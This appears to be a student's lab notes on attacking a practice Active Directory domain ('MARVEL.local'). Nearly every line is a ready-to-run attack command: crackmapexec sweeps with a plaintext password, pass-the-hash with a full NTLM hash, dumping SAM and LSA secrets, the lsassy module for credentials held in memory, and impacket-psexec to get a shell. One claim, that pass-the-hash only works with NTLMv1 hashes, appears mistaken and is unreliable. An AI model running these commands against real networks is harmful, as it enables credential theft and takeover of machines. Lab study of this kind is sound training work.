 - Needed to install using `pimpmykali:
	- `git clone https://github.com/Dewalt-arch/pimpmykali`
	- `cd pimpmykali; sudo ./pimpmykali`
	- Choose option: `%` to install crackmapexec
	- Get help for smb using: `crackmapexec smb --help`

# Sweep the subnet using crackmapexec
---
- `crackmapexec smb 10.0.1.4/24 -u fcastle -d MARVEL.local -p Password1`
	- Domain `fcastle` user is present on both Punisher and Spiderman, therefore:
		- ![[Pasted image 20250329154733.png]]

# Pass the Hash attack using crackmapexec:
---
- Only works ==if hash is `NTLMv1`==
- `crackmapexec smb 10.0.1.4/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth`
	- ![[Pasted image 20250329155406.png]]
- **Dumping SAM hashes:**
- `crackmapexec smb 10.0.1.4/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --sam`
	- ![[Pasted image 20250329155628.png]]
- **Dumping LSA**
- ---
- `crackmapexec smb 10.0.1.4/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --lsa`

	![[Pasted image 20250329160225.png]]

- Some of the secrets are important:
	- `DCC2` : We can take these hashes and try to crack them.
	- These are the ==**stored credentials from which someone logged in past**==.
	- **Could be expired passwords.**

- **More stuff**
- ---
- `crackmapexec -L`
	- `gpp_password` , `impersonation`, `keepass_files`, `keepass_discover`
	- **`LSASSY`**
		- `crackmapexec smb 10.0.1.4/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth -M lsassy`
		- If there is any **==secret stored in memory of logged in users==**, we can see those.

# Psexec
---
- Very similar to `crackmapexec` **but better**
- Gain shell using:
	- `impacket-psexec administrator:'password'@ip_address`
# Stored Credentials using cmedb
---
- `cmedb`
- ![[Pasted image 20250329160550.png]]
- ![[Pasted image 20250329160559.png]]